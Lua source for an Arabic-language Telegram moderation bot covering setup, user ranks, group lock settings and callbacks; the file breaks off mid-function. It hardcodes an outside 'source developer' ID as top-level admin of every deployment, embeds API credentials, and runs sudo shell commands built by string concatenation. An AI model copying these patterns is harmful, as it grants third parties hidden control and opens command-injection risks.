Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
redis = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
-------------------------------------------------------------------
whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
uptime=io.popen([[echo `uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"D,",h+0,"H,",m+0,"M."}'`]]):read('*a'):gsub('[\n\r]+', '')
CPUPer=io.popen([[echo `top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`]]):read('*a'):gsub('[\n\r]+', '')
HardDisk=io.popen([[echo `df -lh | awk '{if ($6 == "/") { print $3"/"$2" ( "$5" )" }}'`]]):read('*a'):gsub('[\n\r]+', '')
linux_version=io.popen([[echo `lsb_release -ds`]]):read('*a'):gsub('[\n\r]+', '')
memUsedPrc=io.popen([[echo `free -m | awk 'NR==2{printf "%sMB/%sMB ( %.2f% )\n", $3,$2,$3*100/$2 }'`]]):read('*a'):gsub('[\n\r]+', '')
-------------------------------------------------------------------
Runbot = require('luatele')
-------------------------------------------------------------------
local infofile = io.open("./sudo.lua","r")
if not infofile then
if not redis:get(Server_Done.."token") then
os.execute('sudo rm -rf setup.lua')
io.write('\27[1;31mSend your Bot Token Now\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request("https://api.telegram.org/bot"..TokenBot.."/getMe")
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mBot Token is Wrong\n')
else
io.write('\27[1;34mThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..TheTokenBot)
redis:setex(Server_Done.."token",300,TokenBot)
end 
else
print('\27[1;34mToken not saved, try again')
end 
os.execute('lua5.3 start.lua')
end
if not redis:get(Server_Done.."id") then
io.write('\27[1;31mSend Developer ID\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('%d+') then
io.write('\n\27[1;34mDeveloper ID saved \n\n\27[0;39;49m')
redis:setex(Server_Done.."id",300,UserId)
else
print('\n\27[1;34mDeveloper ID not saved\n')
end 
os.execute('lua5.3 start.lua')
end
local url , res = https.request('https://api.telegram.org/bot'..redis:get(Server_Done.."token")..'/getMe')
local Json_Info = JSON.decode(url)
local Inform = io.open("sudo.lua", 'w')
Inform:write([[
return {
	
Token = "]]..redis:get(Server_Done.."token")..[[",

id = ]]..redis:get(Server_Done.."id")..[[

}
]])
Inform:close()
local start = io.open("start", 'w')
start:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])
start:close()
local Run = io.open("Run", 'w')
Run:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..Json_Info.result.username..[[ -X kill
screen -S ]]..Json_Info.result.username..[[ ./start
done
]])
Run:close()
redis:del(Server_Done.."id")
redis:del(Server_Done.."token")
os.execute('cp -a ../u/ ../'..Json_Info.result.username..' && rm -fr ~/u')
os.execute('cd && cd '..Json_Info.result.username..';chmod +x start;chmod +x Run;./Run')
end
Information = dofile('./sudo.lua')
sudoid = Information.id
Token = Information.Token
bot_id = Token:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..bot_id)
bot = Runbot.set_config{
api_id=16097628,
api_hash='d21f327886534832fdf728117ac7b809',
session_name=bot_id,
token=Token
}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
namebot = redis:get(bot_id..":namebot") or " لاريكا"
SudosS = {1573309498}
Sudos = {sudoid,1573309498}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender.user_id) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function devS(user)  
local idSu = false  
for k,v in pairs(SudosS) do  
if tonumber(user) == tonumber(v) then  
idSu = true    
end
end  
return idSu  
end
function devB(user)  
local idSub = false  
for k,v in pairs(Sudos) do  
if tonumber(user) == tonumber(v) then  
idSub = true    
end
end  
return idSub
end
function programmer(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":Status:programmer",msg.sender.user_id) or devB(msg.sender.user_id) then    
return true  
else  
return false  
end  
end
end
function developer(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":Status:developer",msg.sender.user_id) or programmer(msg) then    
return true  
else  
return false  
end  
end
end
function Creator(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Creator", msg.sender.user_id) or developer(msg) then    
return true  
else  
return false  
end  
end
end
function BasicConstructor(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:BasicConstructor", msg.sender.user_id) or Creator(msg) then    
return true  
else  
return false  
end  
end
end
function Constructor(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Constructor", msg.sender.user_id) or BasicConstructor(msg) then    
return true  
else  
return false  
end  
end
end
function Owner(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Owner", msg.sender.user_id) or Constructor(msg) then    
return true  
else  
return false  
end  
end
end
function Administrator(msg)
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Administrator", msg.sender.user_id) or Owner(msg) then    
return true  
else  
return false  
end  
end
end
function Vips(msg) 
if msg and msg.chat_id and msg.sender.user_id then
if redis:sismember(bot_id..":"..msg.chat_id..":Status:Vips", msg.sender.user_id) or Administrator(msg) or Bot(msg) then    
return true  
else  
return false  
end  
end
end
function Get_Rank(user_id,chat_id)
if devS(user_id) then  
var = 'مطور السورس'
elseif devB(user_id) then 
var = "المطور الاساسي"  
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = "المطور الثانوي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "البوت"
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = redis:get(bot_id..":Reply:developer"..chat_id) or "المطور"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = redis:get(bot_id..":Reply:Creator"..chat_id) or "المالك"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = redis:get(bot_id..":Reply:BasicConstructor"..chat_id) or "المنشئ الاساسي"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = redis:get(bot_id..":Reply:Constructor"..chat_id) or "المنشئ"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = redis:get(bot_id..":Reply:Owner"..chat_id)  or "المدير"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = redis:get(bot_id..":Reply:Administrator"..chat_id) or "الادمن"  
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = redis:get(bot_id..":Reply:Vips"..chat_id) or "المميز"  
else  
var = redis:get(bot_id..":Reply:mem"..chat_id) or "العضو"
end  
return var
end 
function Norank(user_id,chat_id)
if devS(user_id) then  
var = false
elseif devB(user_id) then 
var = false
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = false
elseif tonumber(user_id) == tonumber(bot_id) then  
var = false
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = false
else  
var = true
end  
return var
end 
function Isrank(user_id,chat_id)
if devS(user_id) then  
var = false
elseif devB(user_id) then 
var = false
elseif redis:sismember(bot_id..":Status:programmer", user_id) then
var = false
elseif tonumber(user_id) == tonumber(bot_id) then  
var = false
elseif redis:sismember(bot_id..":Status:developer", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator", user_id) then
var = false
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator", user_id) then
var = true
elseif redis:sismember(bot_id..":"..chat_id..":Status:Vips", user_id) then
var = true
else  
var = true
end  
return var
end 
function Total_message(msgs)  
local message = ''  
if tonumber(msgs) < 100 then 
message = 'غير متفاعل' 
elseif tonumber(msgs) < 200 then 
message = 'بده يتحسن' 
elseif tonumber(msgs) < 400 then 
message = 'شبه متفاعل' 
elseif tonumber(msgs) < 700 then 
message = 'متفاعل' 
elseif tonumber(msgs) < 1200 then 
message = 'متفاعل قوي' 
elseif tonumber(msgs) < 2000 then 
message = 'متفاعل جدا' 
elseif tonumber(msgs) < 3500 then 
message = 'اقوى تفاعل'  
elseif tonumber(msgs) < 4000 then 
message = 'متفاعل نار' 
elseif tonumber(msgs) < 4500 then 
message = 'قمة التفاعل' 
elseif tonumber(msgs) < 5500 then 
message = 'اقوى متفاعل' 
elseif tonumber(msgs) < 7000 then 
message = 'ملك التفاعل' 
elseif tonumber(msgs) < 9500 then 
message = 'امبروطور التفاعل' 
elseif tonumber(msgs) < 10000000000 then 
message = 'رب التفاعل'  
end 
return message 
end
function GetBio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..User);
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function GetInfoBot(msg)
local GetMemberStatus = bot.getChatMember(msg.chat_id,bot_id).status
if GetMemberStatus.can_change_info then
change_info = true else change_info = false
end
if GetMemberStatus.can_delete_messages then
delete_messages = true else delete_messages = false
end
if GetMemberStatus.can_invite_users then
invite_users = true else invite_users = false
end
if GetMemberStatus.can_pin_messages then
pin_messages = true else pin_messages = false
end
if GetMemberStatus.can_restrict_members then
restrict_members = true else restrict_members = false
end
if GetMemberStatus.can_promote_members then
promote = true else promote = false
end
return{
SetAdmin = promote,
BanUser = restrict_members,
Invite = invite_users,
PinMsg = pin_messages,
DelMsg = delete_messages,
Info = change_info
}
end
function GetSetieng(ChatId)
if redis:get(bot_id..":"..ChatId..":settings:".."messageVideo") == "del" then
messageVideo= "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideo") == "ked" then 
messageVideo= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideo") == "ktm" then 
messageVideo= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideo") == "kick" then 
messageVideo= "بالطرد "   
else
messageVideo= "❌"   
end   
if redis:get(bot_id..":"..ChatId..":settings:".."messagePhoto") == "del" then
messagePhoto = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePhoto") == "ked" then 
messagePhoto = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePhoto") == "ktm" then 
messagePhoto = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePhoto") == "kick" then 
messagePhoto = "بالطرد "   
else
messagePhoto = "❌"   
end   
if redis:get(bot_id..":"..ChatId..":settings:".."JoinByLink") == "del" then
JoinByLink = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."JoinByLink") == "ked" then 
JoinByLink = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."JoinByLink") == "ktm" then 
JoinByLink = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."JoinByLink") == "kick" then 
JoinByLink = "بالطرد "   
else
JoinByLink = "❌"   
end   
if redis:get(bot_id..":"..ChatId..":settings:".."WordsEnglish") == "del" then
WordsEnglish = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsEnglish") == "ked" then 
WordsEnglish = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsEnglish") == "ktm" then 
WordsEnglish = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsEnglish") == "kick" then 
WordsEnglish = "بالطرد "   
else
WordsEnglish = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."WordsPersian") == "del" then
WordsPersian = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsPersian") == "ked" then 
WordsPersian = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsPersian") == "ktm" then 
WordsPersian = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsPersian") == "kick" then 
WordsPersian = "بالطرد "   
else
WordsPersian = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageVoiceNote") == "del" then
messageVoiceNote = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVoiceNote") == "ked" then 
messageVoiceNote = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVoiceNote") == "ktm" then 
messageVoiceNote = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVoiceNote") == "kick" then 
messageVoiceNote = "بالطرد "   
else
messageVoiceNote = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageSticker") == "del" then
messageSticker= "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSticker") == "ked" then 
messageSticker= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSticker") == "ktm" then 
messageSticker= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSticker") == "kick" then 
messageSticker= "بالطرد "   
else
messageSticker= "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."AddMempar") == "del" then
AddMempar = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."AddMempar") == "ked" then 
AddMempar = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."AddMempar") == "ktm" then 
AddMempar = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."AddMempar") == "kick" then 
AddMempar = "بالطرد "   
else
AddMempar = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageAnimation") == "del" then
messageAnimation = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAnimation") == "ked" then 
messageAnimation = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAnimation") == "ktm" then 
messageAnimation = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAnimation") == "kick" then 
messageAnimation = "بالطرد "   
else
messageAnimation = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageDocument") == "del" then
messageDocument= "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageDocument") == "ked" then 
messageDocument= "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageDocument") == "ktm" then 
messageDocument= "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageDocument") == "kick" then 
messageDocument= "بالطرد "   
else
messageDocument= "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageAudio") == "del" then
messageAudio = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAudio") == "ked" then 
messageAudio = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAudio") == "ktm" then 
messageAudio = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageAudio") == "kick" then 
messageAudio = "بالطرد "   
else
messageAudio = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messagePoll") == "del" then
messagePoll = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePoll") == "ked" then 
messagePoll = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePoll") == "ktm" then 
messagePoll = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePoll") == "kick" then 
messagePoll = "بالطرد "   
else
messagePoll = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageVideoNote") == "del" then
messageVideoNote = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideoNote") == "ked" then 
messageVideoNote = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideoNote") == "ktm" then 
messageVideoNote = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageVideoNote") == "kick" then 
messageVideoNote = "بالطرد "   
else
messageVideoNote = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageContact") == "del" then
messageContact = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageContact") == "ked" then 
messageContact = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageContact") == "ktm" then 
messageContact = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageContact") == "kick" then 
messageContact = "بالطرد "   
else
messageContact = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageLocation") == "del" then
messageLocation = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageLocation") == "ked" then 
messageLocation = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageLocation") == "ktm" then 
messageLocation = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageLocation") == "kick" then 
messageLocation = "بالطرد "   
else
messageLocation = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Cmd") == "del" then
Cmd = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Cmd") == "ked" then 
Cmd = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Cmd") == "ktm" then 
Cmd = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Cmd") == "kick" then 
Cmd = "بالطرد "   
else
Cmd = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageSenderChat") == "del" then
messageSenderChat = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSenderChat") == "ked" then 
messageSenderChat = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSenderChat") == "ktm" then 
messageSenderChat = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageSenderChat") == "kick" then 
messageSenderChat = "بالطرد "   
else
messageSenderChat = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messagePinMessage") == "del" then
messagePinMessage = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePinMessage") == "ked" then 
messagePinMessage = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePinMessage") == "ktm" then 
messagePinMessage = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messagePinMessage") == "kick" then 
messagePinMessage = "بالطرد "   
else
messagePinMessage = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Keyboard") == "del" then
Keyboard = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Keyboard") == "ked" then 
Keyboard = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Keyboard") == "ktm" then 
Keyboard = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Keyboard") == "kick" then 
Keyboard = "بالطرد "   
else
Keyboard = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Username") == "del" then
Username = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Username") == "ked" then 
Username = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Username") == "ktm" then 
Username = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Username") == "kick" then 
Username = "بالطرد "   
else
Username = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Tagservr") == "del" then
Tagservr = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Tagservr") == "ked" then 
Tagservr = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Tagservr") == "ktm" then 
Tagservr = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Tagservr") == "kick" then 
Tagservr = "بالطرد "   
else
Tagservr = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."WordsFshar") == "del" then
WordsFshar = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsFshar") == "ked" then 
WordsFshar = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsFshar") == "ktm" then 
WordsFshar = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."WordsFshar") == "kick" then 
WordsFshar = "بالطرد "   
else
WordsFshar = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Markdaun") == "del" then
Markdaun = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Markdaun") == "ked" then 
Markdaun = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Markdaun") == "ktm" then 
Markdaun = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Markdaun") == "kick" then 
Markdaun = "بالطرد "   
else
Markdaun = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Links") == "del" then
Links = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Links") == "ked" then 
Links = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Links") == "ktm" then 
Links = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Links") == "kick" then 
Links = "بالطرد "   
else
Links = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."forward_info") == "del" then
forward_info = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."forward_info") == "ked" then 
forward_info = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."forward_info") == "ktm" then 
forward_info = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."forward_info") == "kick" then 
forward_info = "بالطرد "   
else
forward_info = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."messageChatAddMembers") == "del" then
messageChatAddMembers = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageChatAddMembers") == "ked" then 
messageChatAddMembers = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageChatAddMembers") == "ktm" then 
messageChatAddMembers = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."messageChatAddMembers") == "kick" then 
messageChatAddMembers = "بالطرد "   
else
messageChatAddMembers = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."via_bot_user_id") == "del" then
via_bot_user_id = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."via_bot_user_id") == "ked" then 
via_bot_user_id = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."via_bot_user_id") == "ktm" then 
via_bot_user_id = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."via_bot_user_id") == "kick" then 
via_bot_user_id = "بالطرد "   
else
via_bot_user_id = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Hashtak") == "del" then
Hashtak = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Hashtak") == "ked" then 
Hashtak = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Hashtak") == "ktm" then 
Hashtak = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Hashtak") == "kick" then 
Hashtak = "بالطرد "   
else
Hashtak = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Edited") == "del" then
Edited = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Edited") == "ked" then 
Edited = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Edited") == "ktm" then 
Edited = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Edited") == "kick" then 
Edited = "بالطرد "   
else
Edited = "❌"   
end    
if redis:get(bot_id..":"..ChatId..":settings:".."Spam") == "del" then
Spam = "✔️" 
elseif redis:get(bot_id..":"..ChatId..":settings:".."Spam") == "ked" then 
Spam = "بالتقييد "   
elseif redis:get(bot_id..":"..ChatId..":settings:".."Spam") == "ktm" then 
Spam = "بالكتم "    
elseif redis:get(bot_id..":"..ChatId..":settings:".."Spam") == "kick" then 
Spam = "بالطرد "   
else
Spam = "❌"   
end    
if redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "kick" then 
flood = "بالطرد "   
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "del" then 
flood = "✔️" 
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "ked" then
flood = "بالتقييد "   
elseif redis:hget(bot_id.."Spam:Group:User"..ChatId,"Spam:User") == "ktm" then
flood = "بالكتم "    
else
flood = "❌"   
end     
return {
flood = flood,
Spam = Spam,
Edited = Edited,
Hashtak = Hashtak,
messageChatAddMembers = messageChatAddMembers,
via_bot_user_id = via_bot_user_id,
Markdaun = Markdaun,
Links = Links,
forward_info = forward_info ,
Username = Username,
WordsFshar = WordsFshar,
Tagservr = Tagservr,
messagePinMessage = messagePinMessage,
messageSenderChat = messageSenderChat,
Keyboard = Keyboard,
messageLocation = messageLocation,
Cmd = Cmd,
messageContact =messageContact,
messageAudio = messageAudio,
messageVideoNote = messageVideoNote,
messagePoll = messagePoll,
messageDocument= messageDocument,
messageAnimation = messageAnimation,
AddMempar = AddMempar,
messageSticker= messageSticker,
WordsPersian = WordsPersian,
messageVoiceNote = messageVoiceNote,
JoinByLink = JoinByLink,
messagePhoto = messagePhoto,
WordsEnglish = WordsEnglish,
messageVideo= messageVideo
}
end
function Reply_Status(UserId,TextMsg)
UserInfo = bot.getUser(UserId)
Name_User = UserInfo.first_name
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
UserInfousername = '['..UserInfo.first_name..'](tg://user?id='..UserId..')'
end
return {
by   = '\n*‹ : بواسطه : *'..UserInfousername..'\n'..TextMsg,
i   = '\n*‹ : المستخدم : *'..UserInfousername..'\n'..TextMsg,
yu    = '\n*‹ : عزيزي : *'..UserInfousername..'\n'..TextMsg
}
end
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
return './'..name
end
end
function redis_get(ChatId,tr)
if redis:get(bot_id..":"..ChatId..":settings:"..tr)  then
tf = "✔️" 
else
tf = "❌"   
end    
return tf
end
function Adm_Callback()
if redis:get(bot_id..":Twas") then
Twas = "✅"
else
Twas = "❌"
end
if redis:get(bot_id..":Notice") then
Notice = "✅"
else
Notice = "❌"
end
if redis:get(bot_id..":Departure") then
Departure  = "✅"
else
Departure = "❌"
end
if redis:get(bot_id..":sendbot") then
sendbot  = "✅"
else
sendbot = "❌"
end
if redis:get(bot_id..":infobot") then
infobot  = "✅"
else
infobot = "❌"
end
return {
t   = Twas,
n   = Notice,
d   = Departure,
s   = sendbot,
i    = infobot
}
end
---------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Callback(data)
----------------------------------------------------------------------------------------------------
Text = bot.base64_decode(data.payload.data)
user_id = data.sender_user_id
chat_id = data.chat_id
msg_id = data.message_id
if Text and Text:match("^delforme_(.*)_(.*)") then
local infomsg = {Text:match("^delforme_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"⌁ عذرا الامر لا يخصك ", true)
end
if Type == "1" then
redis:del(bot_id..":"..chat_id..":"..user_id..":message")
yrv = "رسائلك"
elseif Type == "2" then
redis:del(bot_id..":"..chat_id..":"..user_id..":Editmessage")
yrv = "سحكاتك"
elseif Type == "3" then
redis:del(bot_id..":"..chat_id..":"..user_id..":Addedmem")
yrv = "جهاتك"
elseif Type == "4" then
redis:del(bot_id..":"..chat_id..":"..user_id..":game")
yrv = "نقاطك"
end
bot.answerCallbackQuery(data.id,"تم مسح "..yrv.." بنجاح .", true)
end
if Text and Text:match("^iforme_(.*)_(.*)") then
local infomsg = {Text:match("^iforme_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"⌁ عذرا الامر لا يخصك ", true)
end
if Type == "1" then
yrv = "رسائلك"
elseif Type == "2" then
yrv = "سحكاتك"
elseif Type == "3" then
yrv = "جهاتك"
elseif Type == "4" then
yrv = "نقاطك"
end
bot.answerCallbackQuery(data.id,"شستفاديت عود من شفت "..yrv.." بس كلي .", true)
end
if Text and Text:match("^mn_(.*)_(.*)") then
